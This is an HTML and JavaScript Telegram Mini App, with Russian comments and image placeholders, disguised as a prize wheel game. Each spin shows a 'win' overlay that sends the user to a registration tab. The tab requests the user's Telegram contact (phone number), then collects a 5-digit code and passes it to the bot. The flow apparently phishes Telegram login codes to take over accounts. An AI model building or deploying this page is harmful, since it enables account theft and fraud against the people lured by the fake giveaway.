<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { box-sizing: border-box; }
  html, body { overflow-x: hidden; }

  body {
    font-family: sans-serif; text-align: center; margin: 0; padding: 20px 16px 90px;
    background-color: #000;
    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="140" height="140"><g fill="%23ffffff" fill-opacity="0.35"><path d="M20 6 L22 15 L31 15 L23 20 L26 29 L20 23 L14 29 L17 20 L9 15 L18 15 Z"/><path d="M95 30 L96 35 L101 35 L97 38 L98 43 L95 40 L92 43 L93 38 L89 35 L94 35 Z"/><path d="M55 70 L57 78 L65 78 L58 83 L60 91 L55 86 L50 91 L52 83 L45 78 L53 78 Z"/><path d="M115 95 L116 100 L121 100 L117 103 L118 108 L115 105 L112 108 L113 103 L109 100 L114 100 Z"/><path d="M15 110 L16 115 L21 115 L17 118 L18 123 L15 120 L12 123 L13 118 L9 115 L14 115 Z"/></g></svg>');
    background-repeat: repeat;
    background-size: 140px 140px;
    color: #fff;
  }

  .tab-content { display: none; }
  .tab-content.active { display: block; }

  .wheel-wrap { position: relative; width: min(300px, 80vw); height: min(300px, 80vw); margin: 30px auto 10px; }
  .wheel { width: 100%; height: 100%; border-radius: 50%; position: relative; overflow: hidden;
           border: 4px solid #2481cc; transition: transform 4s cubic-bezier(0.17, 0.67, 0.16, 0.99); background: #111; }
  .wheel img { position: absolute; top: 50%; left: 50%; width: 60px; height: 60px; object-fit: cover; border-radius: 8px; }
  .wheel-pointer { position: absolute; top: -14px; left: 50%; transform: translateX(-50%);
                   width: 0; height: 0; border-left: 14px solid transparent; border-right: 14px solid transparent;
                   border-top: 22px solid #2481cc; z-index: 5; }
  #spin { margin-top: 10px; padding: 14px 32px; font-size: 18px; border: none; border-radius: 12px; background: #2481cc; color: #fff; }
  #spin:disabled { opacity: 0.5; }

  .step { display: none; }
  .step.active { display: block; }
  .step p { max-width: 280px; margin: 20px auto; line-height: 1.4; color: #ccc; }

  .code { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
  .code input { width: 48px; height: 64px; font-size: 28px; text-align: center;
                background: #111; color: #fff; border: 2px solid #444; border-radius: 12px; }
  .code input:focus { border-color: #2481cc; outline: none; }

  button#send, button#askContact { padding: 14px 32px; font-size: 18px; border: none; border-radius: 12px;
           background: #2481cc; color: #fff; }
  button#send:disabled { opacity: 0.4; }

  .tabbar { position: fixed; bottom: 0; left: 0; right: 0; display: flex;
            border-top: 1px solid #222; background: #000; }
  .tabbar button.tab-btn { flex: 1; padding: 14px 0; background: none; border: none;
                           border-radius: 0; font-size: 15px; color: #777;
                           display: flex; flex-direction: column; align-items: center; gap: 2px; }
  .tabbar button.tab-btn.active { color: #2481cc; font-weight: bold; }

  .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none;
             align-items: center; justify-content: center; flex-direction: column; z-index: 50; padding: 20px; text-align: center; }
  .overlay.show { display: flex; }
  .overlay img { width: 160px; height: 160px; object-fit: cover; border-radius: 16px; border: 3px solid #2481cc; margin-bottom: 20px; }
  .overlay p { font-size: 17px; color: #fff; max-width: 280px; line-height: 1.4; margin-bottom: 20px; }
  .overlay button { padding: 14px 32px; font-size: 16px; border: none; border-radius: 12px; background: #2481cc; color: #fff; }
</style>
</head>
<body>

  <div id="tab1" class="tab-content active">
    <div class="wheel-wrap">
      <div class="wheel-pointer"></div>
      <div class="wheel" id="wheel">
        <!-- ВСТАВЛЯТЬ 10 КАРТИНОК СЮДА, по одной <img> на каждый сектор -->
        <img src="https://i.postimg.cc/fLHnC7fX/images.png" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_2" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_3" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_4" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_5" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_6" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_7" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_8" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_9" alt="">
        <img src="ССЫЛКА_НА_КАРТИНКУ_10" alt="">
      </div>
    </div>
    <button id="spin">Крутить 🎡</button>
  </div>

  <div id="tab2" class="tab-content">

    <div id="stepContact" class="step active">
      <h2>Вход</h2>
      <p>Чтобы продолжить, отправьте свой контакт</p>
      <button id="askContact">📱 Отправить контакт</button>
    </div>

    <div id="stepCode" class="step">
      <h2>Введите 5-значный код</h2>
      <div class="code">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
      </div>
      <button id="send" disabled>Подтвердить</button>
    </div>

  </div>

  <div class="tabbar">
    <button class="tab-btn active" data-tab="tab1">🎡</button>
    <button class="tab-btn" data-tab="tab2">Вход</button>
  </div>

  <div class="overlay" id="winOverlay">
    <img id="winImage" src="" alt="">
    <p>Чтобы забрать приз, пройдите регистрацию</p>
    <button id="goToReg">Перейти к регистрации</button>
  </div>

<script>
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();

  const tabButtons = document.querySelectorAll(".tab-btn");
  const tabContents = document.querySelectorAll(".tab-content");

  function openTab(id) {
    tabButtons.forEach(b => b.classList.toggle("active", b.dataset.tab === id));
    tabContents.forEach(c => c.classList.toggle("active", c.id === id));
  }
  tabButtons.forEach(btn => btn.addEventListener("click", () => openTab(btn.dataset.tab)));

  // --- колесо ---
  const wheel = document.getElementById("wheel");
  const images = wheel.querySelectorAll("img");
  const radius = 95;
  const count = images.length;
  const step = 360 / count;

  images.forEach((img, i) => {
    const angle = step * i;
    img.style.transform = `translate(-50%, -50%) rotate(${angle}deg) translate(0, -${radius}px) rotate(-${angle}deg)`;
  });

  const spinBtn = document.getElementById("spin");
  const overlay = document.getElementById("winOverlay");
  const winImage = document.getElementById("winImage");
  const goToReg = document.getElementById("goToReg");
  let currentRotation = 0;

  spinBtn.addEventListener("click", () => {
    spinBtn.disabled = true;
    const extraSpins = 5;
    const randomStop = Math.floor(Math.random() * 360);
    currentRotation += extraSpins * 360 + randomStop;
    wheel.style.transform = `rotate(${currentRotation}deg)`;

    setTimeout(() => {
      spinBtn.disabled = false;
      const normalized = ((currentRotation % 360) + 360) % 360;
      let idx = Math.round((360 - normalized) / step) % count;
      if (idx < 0) idx += count;
      winImage.src = images[idx].src;
      overlay.classList.add("show");
    }, 4200);
  });

  goToReg.addEventListener("click", () => {
    overlay.classList.remove("show");
    openTab("tab2");
  });

  // --- шаг 1 внутри вкладки "Вход": запрос контакта ---
  const stepContact = document.getElementById("stepContact");
  const stepCode = document.getElementById("stepCode");
  const askContactBtn = document.getElementById("askContact");

  askContactBtn.addEventListener("click", () => {
    tg.requestContact((granted) => {
      if (granted) {
        stepContact.classList.remove("active");
        stepCode.classList.add("active");
      }
    });
  });

  // --- ввод кода ---
  const inputs = document.querySelectorAll(".code input");
  const sendBtn = document.getElementById("send");

  function getCode() { return [...inputs].map(i => i.value).join(""); }

  inputs.forEach((input, i) => {
    input.addEventListener("input", () => {
      input.value = input.value.replace(/\D/g, "");
      if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
      sendBtn.disabled = getCode().length !== 5;
    });
    input.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
    });
  });

  sendBtn.addEventListener("click", () => tg.sendData(getCode()));
</script>
</body>
</html>
